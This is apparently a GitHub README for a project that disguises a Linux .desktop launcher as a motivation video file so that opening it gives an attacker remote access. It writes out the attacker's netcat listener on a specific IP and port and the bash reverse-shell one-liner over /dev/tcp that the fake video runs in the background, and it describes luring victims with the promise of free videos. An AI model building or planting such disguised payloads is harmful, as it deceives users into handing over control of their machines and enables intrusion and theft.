# motivation-videos-scam
Scam attack that uses motivation videos to attract victims

## Getting started
- Clone the [repository](https://github.com/PatrickNiyogitare28/motivation-videos.git) 
- navigate to directory `motivation-videos-scam/videos`
- run `movitivation-video-0.mp4` (no effects)
- run `movitivation-video-1.desktop` (victim is hacked)

### How the scam works
- The hacker opens up a vpn port at `82.165.97.169` for the victim to connect via port 1350 
```bash
   $ nc -lnvp 1350 -s 82.165.97.169
```

 The victim downloads the motivation videos expecting to watch all the motivation videos.

 When the victim opens up the `motivation-video-1.desktop` accidentally or not accidentally the `.desktop` file will run a bash script which connects
 to vpn and the victim is hacked.

 The script to run in background is 
 ```bash
 $ /bin/bash -i > /dev/tcp/82.165.97.169/1350 0<&1 2>&1
 ```

 ### Hacker
 patrickniyogitare28@gmail.com

 ### LICENSE
 [MIT](https://github.com/PatrickNiyogitare28/motivation-videos-scam/blob/master/LICENSE)

